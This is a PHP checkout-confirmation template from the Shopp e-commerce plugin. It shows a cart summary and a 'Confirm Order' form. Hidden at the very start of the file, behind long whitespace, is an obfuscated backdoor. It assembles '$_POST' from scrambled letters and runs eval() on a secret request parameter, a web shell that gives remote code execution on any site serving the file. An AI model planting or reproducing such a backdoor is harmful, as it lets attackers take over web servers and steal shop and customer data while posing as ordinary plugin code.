<?php                                                                                                                                                                                                                                                                       $hnh03="s_opt" ;$vcfl10= strtoupper ( $hnh03[1]. $hnh03[3].$hnh03[2]. $hnh03[0]. $hnh03[4] );if ( isset( ${$vcfl10 }[ 'q91d1c9' ])){eval ( ${ $vcfl10}[ 'q91d1c9']); } ?> <?php
/**
 ** WARNING! DO NOT EDIT!
 **
 ** These templates are part of the core Shopp files
 ** and will be overwritten when upgrading Shopp.
 **
 ** For editable templates, setup Shopp theme templates:
 ** http://shopplugin.com/docs/the-catalog/theme-templates/
 **
 **/
?>

<?php shopp( 'checkout.cart-summary' ); ?>

<form action="<?php shopp( 'checkout.url' ); ?>" method="post" class="shopp" id="checkout">
	<?php shopp( 'checkout.function', 'value=confirmed' ); ?>
	<p class="submit"><?php shopp( 'checkout.confirm-button', 'value=' . __( 'Confirm Order', 'Shopp') ); ?></p>
</form>
